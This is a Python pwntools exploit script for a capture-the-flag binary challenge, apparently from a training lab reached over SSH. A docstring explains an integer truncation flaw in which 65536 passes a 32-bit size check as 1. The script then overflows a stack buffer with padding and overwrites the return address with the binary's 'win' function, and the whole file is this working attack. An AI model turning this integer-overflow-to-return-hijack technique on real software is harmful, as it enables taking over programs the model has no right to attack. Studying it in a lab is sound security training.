#!/usr/bin/env python

from pwn import *

get_flag = True
chall_name = 'bm_level5.0'

"""
record_num and record_size are uint (max size: 4,294,967,295)
these value are compared using 32 bits register (EAX) later
so we can store the int 65536 in the uint space (RAX) but
these number will overflow the EAX and in the CMP will see
65536 as 1. Bypassing the check we can make a overflow.
"""

def run_with_gdb(p):
    gdb.attach(p,'''
    b *main
    b *challenge+921''')
    run_exploit(p, False)

def run_exploit(p, debug):
    if debug:
        run_with_gdb(p)
    binary = ELF(chall_name)
    win_address = p64(binary.symbols['win'])

    #overflow = cyclic(400, n=8)
    overflow_until_ret = b'A' * cyclic_find('taaaaaaa', n=8)

    print(p.recv(timeout=2).decode())
    p.sendline('65536') # 
    print(p.recv(timeout=2).decode())
    p.sendline('65536')

    #p.sendline(overflow)
    p.sendline(overflow_until_ret + win_address)
    p.interactive()

if get_flag:
    ssh_connection = ssh(host='pwn',user='hacker')
    process_full_path = '/challenge/' + chall_name
    print(ssh_connection.connected())
    p = ssh_connection.run(process_full_path)
    run_exploit(p, False)
    ssh_connection.close()
else:
    process_full_path = './' + chall_name
    p = process(process_full_path)
    run_exploit(p, True)
